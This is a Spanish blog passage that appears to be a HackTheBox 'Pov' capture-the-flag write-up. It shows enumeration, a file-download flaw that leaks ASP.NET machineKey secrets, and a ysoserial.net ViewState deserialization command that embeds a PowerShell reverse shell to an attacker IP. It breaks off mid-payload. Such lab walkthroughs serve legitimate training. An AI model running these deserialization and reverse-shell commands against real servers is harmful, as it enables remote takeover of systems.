<!doctype html><html lang=es><head><title>HTB Pov WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="HackThebox 'Pov' WriteUp"><meta name=keywords content="blog,pentesting,hacking"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB Pov WriteUp"><meta name=twitter:description content="HackThebox 'Pov' WriteUp"><meta property="og:title" content="HTB Pov WriteUp"><meta property="og:description" content="HackThebox 'Pov' WriteUp"><meta property="og:type" content="article"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/es/posts/pov/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-06-08T00:00:00+00:00"><meta property="article:modified_time" content="2024-06-08T00:00:00+00:00"><link rel=canonical href=https://gunzf0x.github.io/pentesting/es/posts/pov/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting/es>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/es/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/projects/>Proyectos</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/contact/>Contacto</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/posts/pov/>üá¨üáß</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/es/posts/pov/>HTB Pov WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-06-08T00:00:00Z>8 junio, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
12 minutos de lectura.</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/es/tags/htb/>HTB</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/windows/>Windows</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/medium/>Medium</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/view-state/>View State</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/powershell/>Powershell</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/cmd/>Cmd</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/ysoserial/>Ysoserial</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/netcat/>Netcat</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/runascs/>Runascs</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/burpsuite/>Burpsuite</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/sedebugprivilege/>Sedebugprivilege</a></span></div></div></header><div class=post-content><h1 id=pov----hackthebox>Pov &ndash; HackTheBox
<a class=heading-link href=#pov----hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Windows</em></li><li>Difficulty / Dificultad: <em>Medium</em> / <em>Media</em></li><li>Platform / Plataforma: <em>HackTheBox</em></li></ul><p><img alt="&lsquo;Pov&rsquo; Avatar" src=/pentesting/images/Pov_avatar.png></p><hr><h2 id=resumen>Resumen
<a class=heading-link href=#resumen><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p><code>Pov</code> es una m√°quina <code>Windows</code> de dificultad media de <code>HackTheBox</code>. Luego de performar algunos scans sobre sub-dominios, somos capaces de encontrar un virtual host con el sub-dominio <code>dev.pov.htb</code> disponible para el servidor web. Este nuevo sitio web, el cual se ve como un blog, nos permite descargar un portafolio PDF. Analizando c√≥mo el servidor provee este archivo, encontramos que √©ste utiliza <code>View State</code>. Luego de una breve investigaci√≥n, usamos la herramienta <a href=https://github.com/pwntester/ysoserial.net class=external-link target=_blank rel=noopener><code>YSoSerial.Net</code></a> para generar un payload y ganar acceso a la m√°quina v√≠ctima. Una vez dentro, somos capaces de encontrar credenciales para otro usuario llamado <code>alaading</code>, al cual podemos pivotear internamente con estas credenciales. Este nuevo usuario tiene el privilegio <code>SeDebugPrivilege</code>, aunque deshabilitado. Utilizando distintas herramientas podemos volver a habilitar este privilegio. Finalmente, abusando de este privilegio, somos capaces de &ldquo;secuestrar&rdquo; un proceso privilegiado y tomar control total sobre la m√°quina v√≠ctima.</p><hr><h2 id=user--usuario>User / Usuario
<a class=heading-link href=#user--usuario><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>Empezando con un scan de <code>Nmap</code> √©ste muestra s√≥lo 1 puerto abierto: <code>80</code> <code>HTTP</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p80 10.10.11.251 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-15 18:45 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.11.251
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.15s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT   STATE SERVICE VERSION
</span></span></span><span class=line><span class=cl><span class=go>80/tcp open  http    Microsoft IIS httpd 10.0
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: pov.htb
</span></span></span><span class=line><span class=cl><span class=go>| http-methods:
</span></span></span><span class=line><span class=cl><span class=go>|_  Potentially risky methods: TRACE
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Microsoft-IIS/10.0
</span></span></span><span class=line><span class=cl><span class=go>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 14.20 seconds
</span></span></span></code></pre></div><p>donde podemos ver que estamos ante un servidor web <code>Microsoft Internet Information Services</code> (<code>Microsoft IIS</code>).</p><ul><li>Visitando el sitio <code>http://10.10.11.251</code> (donde <code>10.10.11.251</code> es la IP de la m√°quina v√≠ctima) muestra un simple sitio web:</li></ul><p><img alt="Pov 1" src=/pentesting/images/Pov_1.png></p><p>El sitio presenta un projecto acerca de ciberseguridad. Como sea, muchos de los botones de la p√°gina no funcionan, ni llevan a algo.</p><ul><li>Dado que no podemos interactuar con la p√°gina, empezar√© a buscar por directorios aplicando un <code>Brute Force Directory Listing</code> (Listado de Directorios por Fuerza Bruta) con <code>Gobuster</code>, pero no obtuve nada.</li><li>En este punto empezar√© a buscar por <code>vhosts</code>. Para esto, primero agrego <code>10.10.11.251</code> con el dominio <code>pov.htb</code>, dado que <code>pov.htb</code> est√° presente en el nombre del sitio web y, tambi√©n, el final de la p√°gina web (y del par√°metro <code>http-title</code> del scan de <code>Nmap</code>). Esto lo hacemos corriendo el comando:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ echo &#39;10.10.11.251 pov.htb&#39; | sudo tee -a /etc/hosts
</span></span></span></code></pre></div><ul><li>Una vez hemos agregado este dominio a nuestro archivo <code>/etc/hosts</code>, empezemos a buscar por subdominios usando <code>ffuf</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://pov.htb/ -H &#39;Host: FUZZ.pov.htb&#39; -fl 234
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>        /&#39;___\  /&#39;___\           /&#39;___\
</span></span></span><span class=line><span class=cl><span class=go>       /\ \__/ /\ \__/  __  __  /\ \__/
</span></span></span><span class=line><span class=cl><span class=go>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
</span></span></span><span class=line><span class=cl><span class=go>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
</span></span></span><span class=line><span class=cl><span class=go>         \ \_\   \ \_\  \ \____/  \ \_\
</span></span></span><span class=line><span class=cl><span class=go>          \/_/    \/_/   \/___/    \/_/
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>       v2.1.0-dev
</span></span></span><span class=line><span class=cl><span class=go>________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> :: Method           : GET
</span></span></span><span class=line><span class=cl><span class=go> :: URL              : http://pov.htb/
</span></span></span><span class=line><span class=cl><span class=go> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
</span></span></span><span class=line><span class=cl><span class=go> :: Header           : Host: FUZZ.pov.htb
</span></span></span><span class=line><span class=cl><span class=go> :: Follow redirects : false
</span></span></span><span class=line><span class=cl><span class=go> :: Calibration      : false
</span></span></span><span class=line><span class=cl><span class=go> :: Timeout          : 10
</span></span></span><span class=line><span class=cl><span class=go> :: Threads          : 40
</span></span></span><span class=line><span class=cl><span class=go> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
</span></span></span><span class=line><span class=cl><span class=go> :: Filter           : Response lines: 234
</span></span></span><span class=line><span class=cl><span class=go>________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>dev                     [Status: 302, Size: 152, Words: 9, Lines: 2, Duration: 158ms]
</span></span></span><span class=line><span class=cl><span class=go>:: Progress: [4989/4989] :: Job [1/1] :: 260 req/sec :: Duration: [0:00:28] :: Errors: 0 ::
</span></span></span></code></pre></div><p>Donde encontramos 1 subdominio: <code>dev.pov.htb</code>. De manera que lo agrego a mi archivo <code>/etc/hosts</code>, y √©ste se ve ahora como:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat /etc/hosts | tail -n 1
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>10.10.11.251 pov.htb dev.pov.htb
</span></span></span></code></pre></div><ul><li>Ahora que hemos agregado este sitio, podemos visitarlo. Primero lo reviso utilizando <code>cURL</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s http://dev.pov.htb
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;head&gt;&lt;title&gt;Document Moved&lt;/title&gt;&lt;/head&gt;
</span></span></span><span class=line><span class=cl><span class=go>&lt;body&gt;&lt;h1&gt;Object Moved&lt;/h1&gt;This document may be found &lt;a HREF=&#34;http://dev.pov.htb/portfolio/&#34;&gt;here&lt;/a&gt;&lt;/body&gt;
</span></span></span></code></pre></div><p>donde podemos ver que √©ste redirige a <code>http://dev.pov.htb/portfolio</code>.</p><ul><li>Visitando <code>http://dev.pov.htb/portfolio</code> muestra otra p√°gina web:</li></ul><p><img alt="Pov 2" src=/pentesting/images/Pov_2.png></p><ul><li>Yendo a la parte inferior de esta p√°gina web, el sitio web nos permite descargar un archivo <code>PDF</code> el cual no es m√°s que el CV de un dise√±ador:</li></ul><p><img alt="Pov 3" src=/pentesting/images/Pov_3.png></p><ul><li>Descargando y chequeando este CV, aparentemente no parece ser m√°s que un CV normal:</li></ul><p><img alt="Pov 4" src=/pentesting/images/Pov_4.png></p><ul><li>Noto que cuando pongo my mouse encima del bot√≥n <code>Download CV</code> (pero sin clickearlo), √©ste llama a una funci√≥n de <code>JavaScript</code> llamada <code>__doPostBack</code>. Mirando el c√≥digo fuente de la p√°gina de esta funci√≥n, √©ste se ve como:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>var</span> <span class=nx>theForm</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>forms</span><span class=p>[</span><span class=s1>&#39;form1&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>theForm</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>theForm</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>form1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>__doPostBack</span><span class=p>(</span><span class=nx>eventTarget</span><span class=p>,</span> <span class=nx>eventArgument</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>theForm</span><span class=p>.</span><span class=nx>onsubmit</span> <span class=o>||</span> <span class=p>(</span><span class=nx>theForm</span><span class=p>.</span><span class=nx>onsubmit</span><span class=p>()</span> <span class=o>!=</span> <span class=kc>false</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>theForm</span><span class=p>.</span><span class=nx>__EVENTTARGET</span><span class=p>.</span><span class=nx>value</span> <span class=o>=</span> <span class=nx>eventTarget</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nx>theForm</span><span class=p>.</span><span class=nx>__EVENTARGUMENT</span><span class=p>.</span><span class=nx>value</span> <span class=o>=</span> <span class=nx>eventArgument</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nx>theForm</span><span class=p>.</span><span class=nx>submit</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>donde est√° llamando a las variables <code>eventTarget</code> y <code>eventArguent</code> para ejecutar alguna acci√≥n.</p><ul><li>Para revisar qu√© es lo que realmente sucede cuando clickeo en el bot√≥n <code>Download CV</code> es que decido iniciar una sesi√≥n de <code>Burpsuite</code> e interceptar la petici√≥n que se manda cuando clickeamos sobre el bot√≥n de descarga. Haciendo esto tenemos lo siguiente:</li></ul><p><img alt="Pov 5" src=/pentesting/images/Pov_5.png></p><p>donde tenemos la petici√≥n <code>HTTP</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/portfolio/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>dev.pov.htb</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>357</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://dev.pov.htb</span>
</span></span><span class=line><span class=cl><span class=n>DNT</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://dev.pov.htb/portfolio/</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>__EVENTTARGET=download&amp;__EVENTARGUMENT=&amp;__VIEWSTATE=pq4lVre5C%2BeE0zeQ7GhEylpWd60Dp5RKMQDIZjOnuFnsE4TMwTIgBobkoGJk2n3eD%2F2aWP0l4Ap2cIh98d8PLk%2Fi2uk%3D&amp;__VIEWSTATEGENERATOR=8E0F0FA3&amp;__EVENTVALIDATION=19foRXLpnWS5AHjpvopq9vbMZW8BAnmzZPMqWj3tx2KqbqPBU3OR1570e0DW5PuIIzjYQMCqfhlGC5NDM5NDlF1IPnamA%2BAJt5iU5ftodSZfiggU20q7HXkcXH7trj%2FIh8IJqw%3D%3D&amp;file=cv.pdf
</span></span></code></pre></div><p>Basados en los argumentos, el servidor est√° usando <code>View State</code>:</p><blockquote><p><code>View State</code> is the method to preserve the Value of the Page and Controls between round trips. It is a Page-Level State Management technique. View State is turned on by default and normally serializes the data in every control on the page regardless of whether it is actually used during a post-back</p></blockquote><p>Aqu√≠ noto, adem√°s, que con el par√°metro <code>file</code> el servidor est√° llamando al archivo <code>cv.pdf</code>.</p><ul><li>Podriamos tratar de manipular cu√°l archivo es llamado. De manera que env√≠o la petici√≥n al <code>Repeater</code> en <code>Burpsuite</code> (<code>Ctrl+R</code>) y cambio el valor de la variable <code>file</code> donde, eventualmente, cambiar el valor de <code>cv.pdf</code> a <code>/web.config</code> funciona:</li></ul><p><img alt="Pov 6" src=/pentesting/images/Pov_6.png></p><p>Con esto obtenemos la respuesta:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span> <span class=m>200</span> <span class=ne>OK</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>private</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/octet-stream</span>
</span></span><span class=line><span class=cl><span class=n>Server</span><span class=o>:</span> <span class=l>Microsoft-IIS/10.0</span>
</span></span><span class=line><span class=cl><span class=n>Content-Disposition</span><span class=o>:</span> <span class=l>attachment; filename=/web.config</span>
</span></span><span class=line><span class=cl><span class=n>X-AspNet-Version</span><span class=o>:</span> <span class=l>4.0.30319</span>
</span></span><span class=line><span class=cl><span class=n>X-Powered-By</span><span class=o>:</span> <span class=l>ASP.NET</span>
</span></span><span class=line><span class=cl><span class=n>Date</span><span class=o>:</span> <span class=l>Wed, 15 May 2024 23:17:09 GMT</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>866</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=n>configuration</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=o>&lt;</span><span class=n>system</span><span class=p>.</span><span class=n>web</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=o>&lt;</span><span class=n>customErrors</span> <span class=n>mode</span><span class=o>=</span><span class=s>&#34;On&#34;</span> <span class=n>defaultRedirect</span><span class=o>=</span><span class=s>&#34;default.aspx&#34;</span> <span class=o>/&gt;</span>
</span></span><span class=line><span class=cl>    <span class=o>&lt;</span><span class=n>httpRuntime</span> <span class=n>targetFramework</span><span class=o>=</span><span class=s>&#34;4.5&#34;</span> <span class=o>/&gt;</span>
</span></span><span class=line><span class=cl>    <span class=o>&lt;</span><span class=n>machineKey</span> <span class=n>decryption</span><span class=o>=</span><span class=s>&#34;AES&#34;</span> <span class=n>decryptionKey</span><span class=o>=</span><span class=s>&#34;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&#34;</span> <span class=n>validation</span><span class=o>=</span><span class=s>&#34;SHA1&#34;</span> <span class=n>validationKey</span><span class=o>=</span><span class=s>&#34;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&#34;</span> <span class=o>/&gt;</span>
</span></span><span class=line><span class=cl>  <span class=o>&lt;/</span><span class=n>system</span><span class=p>.</span><span class=n>web</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=o>&lt;</span><span class=n>system</span><span class=p>.</span><span class=n>webServer</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=o>&lt;</span><span class=n>httpErrors</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>            <span class=o>&lt;</span><span class=n>remove</span> <span class=n>statusCode</span><span class=o>=</span><span class=s>&#34;403&#34;</span> <span class=n>subStatusCode</span><span class=o>=</span><span class=s>&#34;-1&#34;</span> <span class=o>/&gt;</span>
</span></span><span class=line><span class=cl>            <span class=o>&lt;</span><span class=n>error</span> <span class=n>statusCode</span><span class=o>=</span><span class=s>&#34;403&#34;</span> <span class=n>prefixLanguageFilePath</span><span class=o>=</span><span class=s>&#34;&#34;</span> <span class=n>path</span><span class=o>=</span><span class=s>&#34;http://dev.pov.htb:8080/portfolio&#34;</span> <span class=n>responseMode</span><span class=o>=</span><span class=s>&#34;Redirect&#34;</span> <span class=o>/&gt;</span>
</span></span><span class=line><span class=cl>        <span class=o>&lt;/</span><span class=n>httpErrors</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=o>&lt;</span><span class=n>httpRedirect</span> <span class=n>enabled</span><span class=o>=</span><span class=s>&#34;true&#34;</span> <span class=n>destination</span><span class=o>=</span><span class=s>&#34;http://dev.pov.htb/portfolio&#34;</span> <span class=n>exactDestination</span><span class=o>=</span><span class=s>&#34;false&#34;</span> <span class=n>childOnly</span><span class=o>=</span><span class=s>&#34;true&#34;</span> <span class=o>/&gt;</span>
</span></span><span class=line><span class=cl>    <span class=o>&lt;/</span><span class=n>system</span><span class=p>.</span><span class=n>webServer</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;/</span><span class=n>configuration</span><span class=o>&gt;</span>
</span></span></code></pre></div><ul><li><a href=https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter class=external-link target=_blank rel=noopener>HackTricks ofrece una buen camino sobre c√≥mo explotar el mecanismo <code>ViewState</code></a>. Para esto necesitaremos de la herramienta <code>YSoSerial.Net</code> (la cual puede ser descargada desde su <a href=https://github.com/pwntester/ysoserial.net class=external-link target=_blank rel=noopener>repositorio de Github</a>) y pasarla a otra M√°quina Virtual con <code>Windows</code>. Una vez all√≠, corremos el comando:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\gunzf0x\Downloads&gt; ysoserial.exe -p ViewState -g TypeConfuseDelegate -c &#34;&lt;Command Here&gt;&#34; --path=&#34;/portfolio/default.aspx&#34; --approach=&#34;/&#34; --decryptionalg=&#34;AES&#34; --decryptionkey=&#34;&lt;DescriptionKeyHere&gt;&#34; --validationalg=&#34;SHA1&#34; --validationkey=&#34;&lt;ValidationKeyHere&gt;&#34;
</span></span></span></code></pre></div><ul><li>En mi caso, voy a la p√°gina de <code>Reverse Shell Generator</code> (<a href=https://www.revshells.com/ class=external-link target=_blank rel=noopener>https://www.revshells.com/</a>), escojo el payload <code>PowerShell #3 (Base64)</code>, pongo mi IP de atacante y puerto de escucha (<code>10.10.16.2</code> como mi IP de atacante y <code>443</code> como el puerto en escucha, en mi caso). Luego, de vuelta a la M√°quina Virtual con <code>Windows</code>, decido correr <code>YSoSerial.Net</code> con el comando explicado m√°s arriba, pero ahora agregando el payload/comando y las credenciales halladas:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\gunzf0x\Downloads&gt; ysoserial.exe -p ViewState -g TypeConfuseDelegate --path=&#34;/portfolio/default.aspx&#34; --approach=&#34;/&#34; --decryptionalg=&#34;AES&#34; --decryptionKey=&#34;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&#34; --validationalg=&#34;SHA1&#34; --validationKey=&#34;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&#34; -c &#34;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGU&lt;SNIP&gt;HMAZQAoACkA&#34;
</span></span></span></code></pre></div><p>En mi caso, al correr el programa √©ste genera el payload:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>7OOGcG4TMXWXqCm9Qv4r%2BmtOJ2tPkHx2Cci8xMAorxYGxhDxmwf1qyLMtlPssodM%2BWwRa6cAQkCUqW%2FE%2BjOi3MLYuIf1Qg%2FNAD0bYrc1RGCxEAka%2FRxLC%2BXHNNkPtH9Cwffrc2nvNKc0v69%2BLzGAoJjElBNoxjDltsFUyhP%2FYWFkXPUDD3%2Bf1HU%2FCXj9Ayk3HSxzEfobLY4FxxJzBw8b1h%2F%2Ftz1ePGB86ngU9eLDN1VxvVd573PJPQ%2FJTI4rhOMBVl9iMEqDIpM9%2F3%2BrFFS7G0Yhkrltw%2BNFfC1oplYvvPMWhQFIdoKSFanWoHkYaP%2Fw4F1IGWXSq1u7PQLvpmg5P1evLtSDcUfWNLUiS%2Fd0XS9xP8BkBQuola45DF9iyy5MCb2BYbUswLVqlMt9YcsICABqK36TCHFK0wRK%2BBtX%2Fh2pHg8u5J8J4wdi0umjNQlgH2WhsmqA35LUcC5NfJLowO00Z%2FkU2m3PQOzOnmkZTjCg0eHVE4LUceMJ2NOhf%2B17gjcc4WD55%2Bvqt7zO6klqv8khzoEcxpr7zNlaFhfcJZMFpQ8dWVNs9j%2Fa1pbk4bzQ3CTWMPRGw%2BRl7V%2BTxL3O0G09hh9ZloR41ebpQBWY9bGB47gu2fxxdmnhFKpPFmEOD8HCdWO6j1lekEKRENGQWANtPX63fsXMSNAh4jP1RXFUHyV9LiJuDpcNXWkkHaddlZ5HuX8kZ0UT0MtJYVF18%2F21mnduTNEZrFk1tL4IVKOQa%2BUNJdTiZI0DfD%2FEdbAJecS93uj3VkrkmwzJF3ekGyHHDlgZ%2FBADw8LNhbEEd2MvlSKQmOLcGTsigUaCWJDGW9kGHSrXE5tLk3mm1JpcyxltH2VuxEwZ9A%2B%2BWYLHkMG4dmAmmEkiO0hGFRl4D4e1Jm%2BqLmIkKj0YAcbUnJdfuY7MVPxjplDiSpPzhxztgHVCWACgQKargy8zxxmclFjLDF5LJkeAcS27GbJS9swK0OgloqiMsk1Iv1zuFkvQOtDlNvFBtb8zkwAvGN%2FLxCVCYdWiWRZaUNHQLldDyMALNAUKXtS9zyeXG7O2iXW3VVSkx1nu4Ma2BcwUdWZr9D0xIqvu8UW3LwAORDi5A5y6P1q80lWv1qJF4IjXWtd6Yz7LWtnop3Ma8t5LH3qe99gOeVnohOvcXv7KflxLPFZ1ahekiCSRjRmBlgdyeidOAkg7esosKnp%2FXEfjuDhMravbOlUQCW8XlhYHsH34KB6Vps1a5%2BtyZenRRGt9r9DHRiQz0W%2FgZFkUk%2FKzJeJtQGM